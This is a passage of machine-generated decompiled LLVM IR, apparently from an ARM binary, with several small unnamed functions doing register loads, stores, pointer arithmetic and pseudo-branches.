  br label %dec_label_pc_159dc

dec_label_pc_159cc:                               ; preds = %dec_label_pc_15940
  %v2_159cc = add i32 %v1_15950, %v0_159cc
  store i32 %v2_159cc, i32* %ip.global-to-local, align 4
  %v1_159d0 = or i32 %v2_159cc, 1
  store i32 %v1_159d0, i32* %r3.global-to-local, align 4
  %v0_159d4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_159d4, i32* %v2_15948, align 4
  %v0_159d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_159d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_159d8 = add i32 %v1_159d8, 4
  %v3_159d8 = inttoptr i32 %v2_159d8 to i32*
  store i32 %v0_159d8, i32* %v3_159d8, align 4
  br label %dec_label_pc_159dc

dec_label_pc_159dc:                               ; preds = %dec_label_pc_1599c, %dec_label_pc_159cc
  %v0_159dc = load i32, i32* %ip.global-to-local, align 4
  %v3_159e0 = icmp ult i32 %v0_159dc, 131070
  br i1 %v3_159e0, label %dec_label_pc_15a4c, label %dec_label_pc_159e4

dec_label_pc_159e4:                               ; preds = %dec_label_pc_159dc
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_159e8 = load i32, i32* @r7, align 4
  %v2_159e8 = add i32 %v0_159e8, 32
  %v3_159e8 = inttoptr i32 %v2_159e8 to i32*
  %v4_159e8 = load i32, i32* %v3_159e8, align 4
  store i32 %v4_159e8, i32* @r4, align 4
  %v1_159ec = inttoptr i32 %v4_159e8 to i32*
  %v2_159ec = load i32, i32* %v1_159ec, align 4
  store i32 %v2_159ec, i32* %r3.global-to-local, align 4
  %v1_159f0 = and i32 %v2_159ec, 2
  %v2_159f0 = icmp eq i32 %v1_159f0, 0
  br i1 %v2_159f0, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_159e4
  store i32 %v4_159e8, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_159e4, %bb
  store i32 88572, i32* @lr, align 4
  %v1_159f8 = xor i1 %v2_159f0, true
  call void @__pseudo_cond_branch(i1 %v1_159f8, i32 ptrtoint (i32* @global_var_1569c.800 to i32))
  %v0_159fc = load i32, i32* @r4, align 4
  %v1_159fc = add i32 %v0_159fc, 44
  %v2_159fc = inttoptr i32 %v1_159fc to i32*
  %v3_159fc = load i32, i32* %v2_159fc, align 4
  store i32 %v3_159fc, i32* %r3.global-to-local, align 4
  %v1_15a00 = add i32 %v3_159fc, 4
  %v2_15a00 = inttoptr i32 %v1_15a00 to i32*
  %v3_15a00 = load i32, i32* %v2_15a00, align 4
  store i32 %v3_15a00, i32* %r3.global-to-local, align 4
  %v1_15a04 = add i32 %v0_159fc, 836
  %v2_15a04 = inttoptr i32 %v1_15a04 to i32*
  %v3_15a04 = load i32, i32* %v2_15a04, align 4
  store i32 %v3_15a04, i32* @r2, align 4
  %v1_15a08 = and i32 %v3_15a00, -4
  store i32 %v1_15a08, i32* %r3.global-to-local, align 4
  %v3_15a0c = icmp ult i32 %v1_15a08, %v3_15a04
  br i1 %v3_15a0c, label %dec_label_pc_15a4c, label %dec_label_pc_15a14

dec_label_pc_15a14:                               ; preds = %bb15
  store i32 %v0_159fc, i32* %r1.global-to-local, align 4
  %v1_15a18 = add i32 %v0_159fc, 840
  %v2_15a18 = inttoptr i32 %v1_15a18 to i32*
  %v3_15a18 = load i32, i32* %v2_15a18, align 4
  store i32 %v3_15a18, i32* %r0.global-to-local, align 4
  %v2_15a1c = call i32 @function_155ec(i32 %v3_15a18, i32 %v0_159fc)
  store i32 %v2_15a1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a4c

dec_label_pc_15a24:                               ; preds = %dec_label_pc_158e8
  %v2_15a24 = inttoptr i32 %v1_158b8 to i32*
  %v3_15a24 = load i32, i32* %v2_15a24, align 4
  store i32 %v3_15a24, i32* %r0.global-to-local, align 4
  %v1_15a28 = add i32 %v4_158a8, 848
  %v2_15a28 = inttoptr i32 %v1_15a28 to i32*
  %v3_15a28 = load i32, i32* %v2_15a28, align 4
  store i32 %v3_15a28, i32* %r2.global-to-local, align 4
  %v1_15a2c = add i32 %v4_158a8, 868
  %v2_15a2c = inttoptr i32 %v1_15a2c to i32*
  %v3_15a2c = load i32, i32* %v2_15a2c, align 4
  %v2_15a30 = add i32 %v3_15a24, %v1_158b4
  store i32 %v2_15a30, i32* %r1.global-to-local, align 4
  %v1_15a34 = add i32 %v3_15a28, -1
  store i32 %v1_15a34, i32* @r2, align 4
  %v2_15a38 = sub i32 %v3_15a2c, %v2_15a30
  store i32 %v2_15a38, i32* %r3.global-to-local, align 4
  store i32 %v2_15a38, i32* %v2_15a2c, align 4
  %v1_15a40 = load i32, i32* @lr, align 4
  %v2_15a40 = add i32 %v1_15a40, 848
  %v3_15a40 = inttoptr i32 %v2_15a40 to i32*
  store i32 %v1_15a34, i32* %v3_15a40, align 4
  %v0_15a44 = load i32, i32* %r0.global-to-local, align 4
  %v1_15a44 = load i32, i32* @r5, align 4
  %v2_15a44 = sub i32 %v1_15a44, %v0_15a44
  store i32 %v2_15a44, i32* %r0.global-to-local, align 4
  %v4_15a48 = call i32 @function_175a4(i32 %v2_15a44, i32 %v2_15a30, i32 %v1_15a34, i32 %v2_15a38)
  store i32 %v4_15a48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a4c

dec_label_pc_15a4c:                               ; preds = %bb15, %dec_label_pc_159dc, %dec_label_pc_15a14, %dec_label_pc_158c8, %dec_label_pc_15a24
  store i32 %v2_1585c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_15a58 = load i32, i32* @r7, align 4
  %v2_15a58 = add i32 %v0_15a58, 24
  %v3_15a58 = inttoptr i32 %v2_15a58 to i32*
  %v4_15a58 = load i32, i32* %v3_15a58, align 4
  store i32 %v4_15a58, i32* @ip, align 4
  store i32 88676, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15a58)
  br label %dec_label_pc_15a64

dec_label_pc_15a64:                               ; preds = %dec_label_pc_15850, %dec_label_pc_15a4c
  store i32 %v3_15850, i32* @r4, align 4
  store i32 %v6_15850, i32* @r5, align 4
  store i32 %v9_15850, i32* @r6, align 4
  store i32 %v12_15850, i32* @r7, align 4
  store i32 %v18_15850, i32* @lr, align 4
  ret i32 %v2_1585c

; uselistorder directives
  uselistorder i32 %v0_159fc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_159bc, { 1, 0 }
  uselistorder i32 %v1_158fc, { 1, 0 }
  uselistorder i32 %v0_158fc, { 1, 0 }
  uselistorder i32 %v3_158d0, { 1, 0 }
  uselistorder i32 %v1_158b4, { 1, 0, 2 }
  uselistorder i32 %v2_158b0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_158a8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15858, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 3, 14, 0, 1, 2, 13, 4, 5, 11, 12, 6, 7, 8, 10, 9 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_15a64, { 1, 0 }
  uselistorder label %dec_label_pc_15a4c, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_159dc, { 1, 0 }
  uselistorder label %dec_label_pc_1599c, { 1, 0 }
  uselistorder label %dec_label_pc_15990, { 1, 0 }
  uselistorder label %dec_label_pc_1598c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15940, { 1, 0 }
}

define i32 @function_15a74(i32 %arg1) local_unnamed_addr {
dec_label_pc_15a74:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_15a74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15a74, label %bb, label %dec_label_pc_15a74..thread4_crit_edge

dec_label_pc_15a74..thread4_crit_edge:            ; preds = %dec_label_pc_15a74
  %v0_15aa0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_15a74
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15a74..thread4_crit_edge, %bb
  %v0_15aa0 = phi i32 [ %v0_15aa0.pre, %dec_label_pc_15a74..thread4_crit_edge ], [ 0, %bb ]
  %v3_15a8c = load i32, i32* @r4, align 4
  store i32 %v3_15a8c, i32* %stack_var_-12, align 4
  %v6_15a8c = load i32, i32* @r5, align 4
  %v9_15a8c = load i32, i32* @lr, align 4
  %v4_15a9c = load i32, i32* inttoptr (i32 180292 to i32*), align 4
  store i32 %v4_15a9c, i32* @r5, align 4
  store i32 %v0_15aa0, i32* @r4, align 4
  store i32 %v4_15a9c, i32* @r0, align 4
  %v0_15aac = call i32 @function_1569c()
  %v0_15ab0 = load i32, i32* @r4, align 4
  store i32 %v0_15ab0, i32* %r0.global-to-local, align 4
  %v0_15ab4 = load i32, i32* @r5, align 4
  %v2_15abc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15abc, i32* @r4, align 4
  store i32 %v6_15a8c, i32* @r5, align 4
  store i32 %v9_15a8c, i32* @lr, align 4
  %v2_15ac0 = call i32 @function_155ec(i32 %v0_15ab0, i32 %v0_15ab4)
  store i32 %v2_15ac0, i32* %r0.global-to-local, align 4
  %v0_15ac4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15ac4, label %bb12, label %.thread5

bb12:                                             ; preds = %.thread4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread4, %bb12
  %v4_15ac8 = phi i32 [ %v2_15ac0, %.thread4 ], [ 0, %bb12 ]
  ret i32 %v4_15ac8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32)* @function_155ec, { 1, 0 }
  uselistorder i32 ()* @function_1569c, { 3, 2, 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_15acc() local_unnamed_addr {
dec_label_pc_15acc:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 180260, i32* @r5, align 4
  %v4_15ae4 = load i32, i32* inttoptr (i32 180276 to i32*), align 4
  store i32 88816, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15ae4)
  %v2_15b00 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_15b0c = call i32 @function_12a60(i32 1, i32 %v2_15b00, i32 0, i32 32)
  %v4_15b14 = load i32, i32* @global_var_32aa4.808, align 4
  %v2_15b18 = icmp eq i32 %v4_15b14, 0
  br i1 %v2_15b18, label %dec_label_pc_15b20, label %dec_label_pc_15b60

dec_label_pc_15b20:                               ; preds = %dec_label_pc_15acc
  store i32 1, i32* @global_var_32aa4.808, align 4
  br label %dec_label_pc_15b28

dec_label_pc_15b28:                               ; preds = %dec_label_pc_15b70, %dec_label_pc_15b20
  %v0_15b2c = load i32, i32* @r5, align 4
  %v2_15b2c = add i32 %v0_15b2c, 1880
  store i32 %v2_15b2c, i32* @r4, align 4
  %v2_15b38 = add i32 %v0_15b2c, 36
  %v3_15b38 = inttoptr i32 %v2_15b38 to i32*
  %v4_15b38 = load i32, i32* %v3_15b38, align 4
  call void @__pseudo_branch(i32 %v4_15b38)
  %v1_15b48 = call i32 @function_14abc(i32 6)
  %v0_15b54 = load i32, i32* @r5, align 4
  %v2_15b54 = add i32 %v0_15b54, 16
  %v3_15b54 = inttoptr i32 %v2_15b54 to i32*
  %v4_15b54 = load i32, i32* %v3_15b54, align 4
  store i32 88928, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15b54)
  %v4_15b64.pre = load i32, i32* @global_var_32aa4.808, align 4
  br label %dec_label_pc_15b60

dec_label_pc_15b60:                               ; preds = %dec_label_pc_15acc, %dec_label_pc_15b28
  %v0_15b74 = phi i32 [ %v4_15b14, %dec_label_pc_15acc ], [ %v4_15b64.pre, %dec_label_pc_15b28 ]
  %v7_15b68 = icmp eq i32 %v0_15b74, 1
  br i1 %v7_15b68, label %dec_label_pc_15b70, label %dec_label_pc_15bac

dec_label_pc_15b70:                               ; preds = %dec_label_pc_15b60
  %v2_15b70 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_15b70, i32* @r4, align 4
  store i32 2, i32* @global_var_32aa4.808, align 4
  store i32 20, i32* @r2, align 4
  %v2_15b88 = bitcast i32* %stack_var_-28 to i8*
  %v3_15b88 = call i32 @function_13ed0(i8* %v2_15b88, i32 0)
  %v3_15ba4 = call i32 @function_17364(i32 6, i32 %v2_15b70, i32 0)
  br label %dec_label_pc_15b28

dec_label_pc_15bac:                               ; preds = %dec_label_pc_15b60
  %v7_15bac = icmp eq i32 %v0_15b74, 2
  br i1 %v7_15bac, label %dec_label_pc_15bb4, label %dec_label_pc_15bc0

dec_label_pc_15bb4:                               ; preds = %dec_label_pc_15bac
  store i32 3, i32* @global_var_32aa4.808, align 4
  %v0_15bbc = call i32 @function_15acc()
  %v4_15bc0.pre = load i32, i32* @global_var_32aa4.808, align 4
  br label %dec_label_pc_15bc0

dec_label_pc_15bc0:                               ; preds = %dec_label_pc_15bac, %dec_label_pc_15bb4
  %v1_15bc8 = phi i32 [ %v0_15b74, %dec_label_pc_15bac ], [ %v4_15bc0.pre, %dec_label_pc_15bb4 ]
  %v7_15bc4 = icmp eq i32 %v1_15bc8, 3
  br i1 %v7_15bc4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15bc0
  store i32 4, i32* @global_var_32aa4.808, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15bc0, %bb
  call void @__pseudo_cond_branch(i1 %v7_15bc4, i32 ptrtoint (i32* @global_var_12a34.810 to i32))
  br label %dec_label_pc_15bd8

dec_label_pc_15bd8:                               ; preds = %dec_label_pc_15bd8, %.thread1
  %v0_15bd8 = call i32 @function_15acc()
  br label %dec_label_pc_15bd8

; uselistorder directives
  uselistorder i32* @global_var_32aa4.808, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 (i32, i32, i32, i32)* @function_12a60, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_15bc0, { 1, 0 }
  uselistorder label %dec_label_pc_15b60, { 1, 0 }
}

define i32 @function_15be4(i32 %arg1) local_unnamed_addr {
dec_label_pc_15be4:
  %v0_15be4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15be4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15be4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15be4, %bb
  %v4_15bf0 = phi i32 [ %arg1, %dec_label_pc_15be4 ], [ 0, %bb ]
  ret i32 %v4_15bf0

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_15bf4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_15bf4:
  %v0_15bfc = call i32 @function_15c0c()
  ret i32 %v0_15bfc
}

define i32 @function_15c0c() local_unnamed_addr {
dec_label_pc_15c0c:
  %stack_var_-20 = alloca i32, align 4
  %v3_15c0c = load i32, i32* @r4, align 4
  store i32 180260, i32* @r4, align 4
  %v4_15c3c = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_15c3c)
  %v0_15c50 = load i32, i32* @r4, align 4
  %v2_15c50 = add i32 %v0_15c50, 16
  %v3_15c50 = inttoptr i32 %v2_15c50 to i32*
  %v4_15c50 = load i32, i32* %v3_15c50, align 4
  store i32 ptrtoint (i32* @global_var_15c5c.816 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15c50)
  %v2_15c60 = ptrtoint i32* %stack_var_-20 to i32
  %v0_15c64 = load i32, i32* @r4, align 4
  %v2_15c64 = add i32 %v0_15c64, 2056
  %v2_15c68 = inttoptr i32 %v2_15c64 to i32*
  %v3_15c68 = call i32 @function_15fb0(i32* %v2_15c68, i32 %v2_15c60)
  %v0_15c78 = load i32, i32* @r4, align 4
  %v2_15c78 = add i32 %v0_15c78, 24
  %v3_15c78 = inttoptr i32 %v2_15c78 to i32*
  %v4_15c78 = load i32, i32* %v3_15c78, align 4
  call void @__pseudo_branch(i32 %v4_15c78)
  %v3_15c84 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_15c0c, i32* @r4, align 4
  ret i32 %v3_15c84
}

define i32 @function_15c98(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15c98:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_15c98 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15c98, label %bb, label %dec_label_pc_15c98..thread4_crit_edge

dec_label_pc_15c98..thread4_crit_edge:            ; preds = %dec_label_pc_15c98
  %v0_15cd4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_15c98
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15c98..thread4_crit_edge, %bb
  %v0_15cd4 = phi i32 [ %v0_15cd4.pre, %dec_label_pc_15c98..thread4_crit_edge ], [ 0, %bb ]
  store i32 180260, i32* @r6, align 4
  %v2_15cc4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v0_15cd4, i32* @r5, align 4
  store i32 %v2_15cc4, i32* %r0.global-to-local, align 4
  %v4_15ce0 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_15ce0)
  store i32 182164, i32* %r0.global-to-local, align 4
  %v0_15cf4 = load i32, i32* @r6, align 4
  %v2_15cf4 = add i32 %v0_15cf4, 16
  %v3_15cf4 = inttoptr i32 %v2_15cf4 to i32*
  %v4_15cf4 = load i32, i32* %v3_15cf4, align 4
  store i32 89344, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15cf4)
  %v0_15d04 = load i32, i32* @r6, align 4
  %v2_15d04 = add i32 %v0_15d04, 2056
  %v0_15d0c = load i32, i32* @r5, align 4
  store i32 %v0_15d0c, i32* %r0.global-to-local, align 4
  %v1_15d10 = add i32 %v0_15d04, 2064
  %v2_15d10 = inttoptr i32 %v1_15d10 to i32*
  %v3_15d10 = load i32, i32* %v2_15d10, align 4
  store i32 %v3_15d10, i32* @r4, align 4
  %v2_15d14 = inttoptr i32 %v2_15d04 to i32*
  %v3_15d14 = call i32 @function_15ecc(i32 %v0_15d0c, i32* %v2_15d14)
  %v1_15d1c = icmp slt i32 %v3_15d14, 0
  store i32 %v2_15cc4, i32* %r0.global-to-local, align 4
  %v3_15d2c = load i32, i32* @r4, align 4
  %v4_15d2c = add i32 %v3_15d2c, -4
  %storemerge = select i1 %v1_15d1c, i32 0, i32 %v4_15d2c
  %v0_15d30 = load i32, i32* @r6, align 4
  %v2_15d30 = add i32 %v0_15d30, 24
  %v3_15d30 = inttoptr i32 %v2_15d30 to i32*
  %v4_15d30 = load i32, i32* %v3_15d30, align 4
  call void @__pseudo_branch(i32 %v4_15d30)
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_15d50(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15d50:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_15d50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15d50, label %bb, label %dec_label_pc_15d50..thread4_crit_edge

dec_label_pc_15d50..thread4_crit_edge:            ; preds = %dec_label_pc_15d50
  %v0_15d84.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_15d50
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15d50..thread4_crit_edge, %bb
  %v0_15d84 = phi i32 [ %v0_15d84.pre, %dec_label_pc_15d50..thread4_crit_edge ], [ 0, %bb ]
  %v6_15d68 = load i32, i32* @r5, align 4
  store i32 180260, i32* @r4, align 4
  %v2_15d7c = ptrtoint i32* %stack_var_-48 to i32
  store i32 182164, i32* %r5.global-to-local, align 4
  store i32 %v0_15d84, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %v2_15d7c, i32* %r0.global-to-local, align 4
  %v4_15da0 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_15da0)
  %v0_15dac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15dac, i32* %r0.global-to-local, align 4
  %v0_15db4 = load i32, i32* @r4, align 4
  %v2_15db4 = add i32 %v0_15db4, 16
  %v3_15db4 = inttoptr i32 %v2_15db4 to i32*
  %v4_15db4 = load i32, i32* %v3_15db4, align 4
  store i32 89536, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15db4)
  %v0_15dc4 = load i32, i32* @r6, align 4
  %v0_15dc8 = load i32, i32* @r4, align 4
  %v2_15dc8 = add i32 %v0_15dc8, 2056
  %v0_15dcc = load i32, i32* @r7, align 4
  %v0_15dd0 = load i32, i32* @sl, align 4
  store i32 %v0_15dd0, i32* @r0, align 4
  %v1_15dd4 = add i32 %v0_15dc8, 2064
  %v2_15dd4 = inttoptr i32 %v1_15dd4 to i32*
  %v3_15dd4 = load i32, i32* %v2_15dd4, align 4
  store i32 %v3_15dd4, i32* @r5, align 4
  %v4_15dd8 = inttoptr i32 %v0_15dd0 to i32*
  %v5_15dd8 = call i32 @function_16118(i32* %v4_15dd8, i32 %v0_15dc4, i32 %v0_15dcc, i32 %v2_15dc8)
  store i32 %v2_15d7c, i32* %r0.global-to-local, align 4
  %v0_15de8 = load i32, i32* @r4, align 4
  %v2_15de8 = add i32 %v0_15de8, 24
  %v3_15de8 = inttoptr i32 %v2_15de8 to i32*
  %v4_15de8 = load i32, i32* %v3_15de8, align 4
  call void @__pseudo_branch(i32 %v4_15de8)
  %v0_15df4 = load i32, i32* @r5, align 4
  %v1_15df4 = add i32 %v0_15df4, -4
  store i32 %v1_15df4, i32* %r0.global-to-local, align 4
  store i32 %v6_15d68, i32* %r5.global-to-local, align 4
  ret i32 %v1_15df4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_15e10(i32 %arg1) local_unnamed_addr {
dec_label_pc_15e10:
  %v0_15e10 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15e10, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_15e10
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15e10, %bb
  %v10_15e24 = phi i32 [ %arg1, %dec_label_pc_15e10 ], [ 0, %bb ]
  ret i32 %v10_15e24

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_15e28(i32 %arg1) local_unnamed_addr {
dec_label_pc_15e28:
  %stack_var_-40 = alloca i32, align 4
  %v3_15e28 = load i32, i32* @r4, align 4
  %v6_15e28 = load i32, i32* @r5, align 4
  %v9_15e28 = load i32, i32* @r6, align 4
  %v15_15e28 = load i32, i32* @lr, align 4
  store i32 180260, i32* @r4, align 4
  %v2_15e3c = ptrtoint i32* %stack_var_-40 to i32
  store i32 182164, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_15e58 = load i32, i32* inttoptr (i32 180336 to i32*), align 16
  call void @__pseudo_branch(i32 %v4_15e58)
  %v0_15e6c = load i32, i32* @r4, align 4
  %v2_15e6c = add i32 %v0_15e6c, 16
  %v3_15e6c = inttoptr i32 %v2_15e6c to i32*
  %v4_15e6c = load i32, i32* %v3_15e6c, align 4
  store i32 89720, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15e6c)
  %v0_15e7c = load i32, i32* @r6, align 4
  store i32 %v0_15e7c, i32* @r0, align 4
  %v0_15e80 = load i32, i32* @r4, align 4
  %v2_15e80 = add i32 %v0_15e80, 2056
  %v2_15e84 = inttoptr i32 %v0_15e7c to i32*
  %v3_15e84 = call i32 @function_16040(i32* %v2_15e84, i32 %v2_15e80)
  %v0_15e98 = load i32, i32* @r4, align 4
  %v2_15e98 = add i32 %v0_15e98, 24
  %v3_15e98 = inttoptr i32 %v2_15e98 to i32*
  %v4_15e98 = load i32, i32* %v3_15e98, align 4
  call void @__pseudo_branch(i32 %v4_15e98)
  store i32 %v3_15e28, i32* @r4, align 4
  store i32 %v6_15e28, i32* @r5, align 4
  store i32 %v9_15e28, i32* @r6, align 4
  store i32 %v15_15e28, i32* @lr, align 4
  ret i32 %v2_15e3c

; uselistorder directives
  uselistorder i32 182164, { 1, 2, 0 }
}

define i32 @function_15eb4(i32 %arg1) local_unnamed_addr {
dec_label_pc_15eb4:
  %v0_15eb4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15eb4, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_15eb4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_15eb4, %bb
  %v10_15ec8 = phi i32 [ %arg1, %dec_label_pc_15eb4 ], [ 0, %bb ]
  ret i32 %v10_15ec8

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_15ecc(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_15ecc:
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_15ecc = load i32, i32* @r4, align 4
  store i32 %v3_15ecc, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r4, align 4
  %v1_15ed4 = add i32 %tmp, 12
  %v2_15ed4 = inttoptr i32 %v1_15ed4 to i8*
  %v3_15ed4 = load i8, i8* %v2_15ed4, align 1
  %v2_15ed8 = icmp eq i8 %v3_15ed4, 0
  br i1 %v2_15ed8, label %.thread5, label %.thread6

.thread5:                                         ; preds = %dec_label_pc_15ecc
  %v4_15ed4 = zext i8 %v3_15ed4 to i32
  %v1_15ee011 = add i32 %arg1, 4
  store i32 %v1_15ee011, i32* %r6.global-to-local, align 4
  %v1_15ee412 = add i32 %tmp, 8
  %v2_15ee413 = inttoptr i32 %v1_15ee412 to i32*
  %v3_15ee414 = load i32, i32* %v2_15ee413, align 4
  %v3_15f00 = add i32 %v3_15ee414, -4
  %v4_15f00 = inttoptr i32 %v3_15f00 to i32*
  store i32 %v4_15ed4, i32* %v4_15f00, align 4
  br label %dec_label_pc_15f8c

.thread6:                                         ; preds = %dec_label_pc_15ecc
  %v2_15edc = add i32 %tmp, 4
  %v3_15edc = inttoptr i32 %v2_15edc to i32*
  %v4_15edc = load i32, i32* %v3_15edc, align 4
  %v1_15ee0 = add i32 %arg1, 4
  store i32 %v1_15ee0, i32* %r6.global-to-local, align 4
  %v1_15ee4 = add i32 %tmp, 8
  %v2_15ee4 = inttoptr i32 %v1_15ee4 to i32*
  %v3_15ee4 = load i32, i32* %v2_15ee4, align 4
  %v3_15eec = sub i32 %v4_15edc, %v3_15ee4
  %v4_15ef0 = sdiv i32 %v3_15eec, 4
  %v4_15ef4 = sext i8 %v3_15ed4 to i32
  %v4_15efc = mul i32 %v4_15ef0, 5
  %v5_15efc = add i32 %v4_15efc, %v4_15ef4
  %v3_15f04 = add i32 %v3_15ee4, -4
  %v4_15f04 = inttoptr i32 %v3_15f04 to i32*
  store i32 %v5_15efc, i32* %v4_15f04, align 4
  br label %dec_label_pc_15f8c

dec_label_pc_15f8c:                               ; preds = %.thread5, %.thread6
  %v0_15f0c = load i32, i32* %r6.global-to-local, align 4
  %v1_15f0c = add i32 %v0_15f0c, -4
  %v2_15f0c = inttoptr i32 %v1_15f0c to i32*
  %v3_15f0c = load i32, i32* %v2_15f0c, align 4
  %v3_15f14 = call i32 @function_1d400(i32 %v3_15f0c, i32 5)
  %v0_15f8c = call i32 @function_12b24()
  %v2_15f94 = inttoptr i32 %v0_15f8c to i32*
  store i32 22, i32* %v2_15f94, align 4
  %v2_15fa0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15fa0, i32* @r4, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i8 %v3_15ed4, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_15f8c, { 1, 0 }
}

define i32 @function_15fb0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15fb0:
  %ip.global-to-local = alloca i32, align 4
